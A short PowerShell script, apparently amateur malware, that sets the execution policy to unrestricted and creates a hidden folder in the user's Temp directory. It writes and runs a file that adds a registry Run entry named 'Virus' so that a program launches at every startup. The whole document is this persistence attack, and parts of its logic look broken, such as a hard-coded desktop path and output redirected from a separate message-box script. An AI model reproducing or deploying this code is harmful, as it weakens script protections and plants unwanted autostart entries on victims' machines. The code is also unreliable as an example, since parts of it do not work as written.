Set-ExecutionPolicy unrestricted -Force

$who = $env:username
$where = "C:\Users\"+"$who"+"\AppData\Local\Temp\"
$qui = $env:COMPUTERNAME
$dossier = "REG0007"
Set-Location "$where"
If (-not ( Test-Path $dossier)) { New-Item -ItemType Directory -Name $dossier }

$win = "pers.ps1"
If (-not ( Test-Path $win)) { echo "`$path = `"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`"
New-ItemProperty -Path `$path -Name `"Virus`" -Value `"Chrome.exe`" -Force"
set-location "C:\Users\pc-ced\Desktop\powershell"
.".\msgbox.ps1" > $where\$dossier\$win }

Set-Location $where\$dossier


.".\pers.ps1"